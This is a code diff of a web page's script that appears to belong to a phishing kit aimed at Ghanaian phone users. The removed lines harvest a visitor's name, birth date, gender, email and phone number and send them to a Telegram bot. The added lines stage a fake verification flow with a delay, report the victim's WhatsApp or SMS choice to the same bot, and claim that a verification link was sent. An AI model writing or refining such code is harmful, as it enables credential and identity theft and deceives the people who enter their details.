             const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}&parse_mode=HTML`;
 
-            fetch(url, {
+            return fetch(url, {
                 method: 'GET',
                 keepalive: true
-            }).catch(() => {});
+            });
         }
 
-        // Proceed
-        let isProcessing = false;
+        // ============================================================
+        // 4. Show/hide modal
+        // ============================================================
 
-        function proceedToSummary() {
-            if (isProcessing) return;
-            if (!validateForm()) return;
-
-            const day = document.getElementById('dob-day').value.padStart(2, '0');
-            const month = document.getElementById('dob-month').value.padStart(2, '0');
-            const year = document.getElementById('dob-year').value;
-            const dobString = `${year}-${month}-${day}`;
-
-            const fullName = fullNameInput.value.trim();
-            const gender = genderSelect.value;
-            const email = emailInput.value.trim();
-            const phoneDigits = phoneInput.value.trim();
-            const fullPhone = `+233${phoneDigits}`;
-
-            localStorage.setItem('fullName', fullName);
-            localStorage.setItem('dob', dobString);
-            localStorage.setItem('gender', gender);
-            localStorage.setItem('email', email);
-            localStorage.setItem('phone', phoneDigits);
-
-            sendToTelegram({
-                fullName,
-                dob: dobString,
-                gender,
-                email,
-                phoneFull: fullPhone,
-                phoneDigits
-            });
-
-            nextBtn.disabled = true;
-            nextBtn.classList.add('disabled-btn');
-            isProcessing = true;
-            spinner.style.display = 'flex';
-
-            setTimeout(() => {
-                window.location.href = 'summary.html';
-            }, 3000);
+        function showOptionModal() {
+            // Reset state
+            selectedChannel = null;
+            getLinkBtn.disabled = true;
+            getLinkBtn.classList.remove('active');
+            optionGrid.style.display = 'flex';
+            modalSuccess.style.display = 'none';
+            // Remove selected class from all buttons
+            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+            optionModal.style.display = 'flex';
         }
 
-        nextBtn.addEventListener('click', proceedToSummary);
+        function hideOptionModal() {
+            optionModal.style.display = 'none';
+        }
 
-        // Clear errors on input
-        const clearOnChange = (el) => {
-            el.addEventListener('input', () => {
-                hideError();
-                el.classList.remove('invalid');
-                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
-            });
-            el.addEventListener('change', () => {
-                hideError();
-                el.classList.remove('invalid');
-                if (el.id === 'phone') phoneGroup.classList.remove('invalid');
-            });
-        };
-        clearOnChange(fullNameInput);
-        clearOnChange(document.getElementById('dob-day'));
-        clearOnChange(document.getElementById('dob-month'));
-        clearOnChange(document.getElementById('dob-year'));
-        clearOnChange(genderSelect);
-        clearOnChange(emailInput);
-        clearOnChange(phoneInput);
+        // ============================================================
+        // 5. Option selection handler
+        // ============================================================
 
-        phoneInput.addEventListener('input', () => {
-            phoneGroup.classList.remove('invalid');
-            hideError();
+        document.querySelectorAll('.option-btn').forEach(btn => {
+            btn.addEventListener('click', function() {
+                if (isGettingLink) return;
+
+                // Remove selected class from all
+                document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+                // Add selected class to this
+                this.classList.add('selected');
+
+                selectedChannel = this.dataset.option;
+
+                // Enable the Get Link button
+                getLinkBtn.disabled = false;
+                getLinkBtn.classList.add('active');
+            });
         });
 
-        window.hideError = hideError;
+        // ============================================================
+        // 6. Get Link button handler
+        // ============================================================
+
+        getLinkBtn.addEventListener('click', function() {
+            if (isGettingLink || !selectedChannel) return;
+
+            isGettingLink = true;
+            getLinkBtn.disabled = true;
+            getLinkBtn.textContent = 'Sending...';
+
+            sendChoiceToTelegram(selectedChannel)
+                .then(() => {
+                    // Show success
+                    optionGrid.style.display = 'none';
+                    getLinkBtn.style.display = 'none';
+                    modalSuccess.style.display = 'block';
+                    const optionLabel = selectedChannel === 'whatsapp' ? 'WhatsApp' : 'SMS';
+                    successMessage.textContent = `Verification link sent to your ${optionLabel}. Please check your messages.`;
+                })
+                .catch(() => {
+                    // If fails, re-enable
+                    getLinkBtn.textContent = 'Get Link';
+                    getLinkBtn.disabled = false;
+                    getLinkBtn.classList.add('active');
+                    isGettingLink = false;
+                    alert('Could not send request. Please try again.');
+                });
+        });
+
+        // ============================================================
+        // 7. Close modal handlers
+        // ============================================================
+
+        closeModalBtn.addEventListener('click', function() {
+            hideOptionModal();
+            resetModalState();
+            verifyBtn.disabled = false;
+            verifyBtn.style.opacity = '1';
+            verifyBtn.style.cursor = 'pointer';
+        });
+
+        optionModal.addEventListener('click', function(e) {
+            if (e.target === optionModal) {
+                hideOptionModal();
+                resetModalState();
+                verifyBtn.disabled = false;
+                verifyBtn.style.opacity = '1';
+                verifyBtn.style.cursor = 'pointer';
+            }
+        });
+
+        function resetModalState() {
+            isGettingLink = false;
+            selectedChannel = null;
+            getLinkBtn.textContent = 'Get Link';
+            getLinkBtn.disabled = true;
+            getLinkBtn.classList.remove('active');
+            getLinkBtn.style.display = 'block';
+            optionGrid.style.display = 'flex';
+            modalSuccess.style.display = 'none';
+            document.querySelectorAll('.option-btn').forEach(b => b.classList.remove('selected'));
+        }
+
+        // ============================================================
+        // 8. Verify button – show loading, then modal
+        // ============================================================
+
+        verifyBtn.addEventListener('click', function() {
+            verifyBtn.disabled = true;
+            verifyBtn.style.opacity = '0.6';
+            verifyBtn.style.cursor = 'not-allowed';
+            loadingOverlay.style.display = 'flex';
+
+            setTimeout(() => {
+                loadingOverlay.style.display = 'none';
+                showOptionModal();
+            }, 3000);
+        });
+
+        // ============================================================
+        // 9. Clear loading overlay on page load / back navigation
+        // ============================================================
+
+        window.addEventListener('pageshow', function() {
+            loadingOverlay.style.display = 'none';
+            verifyBtn.disabled = false;
+            verifyBtn.style.opacity = '1';
+            verifyBtn.style.cursor = 'pointer';
+            hideOptionModal();
+            resetModalState();
+        });
     </script>
 
 </body>
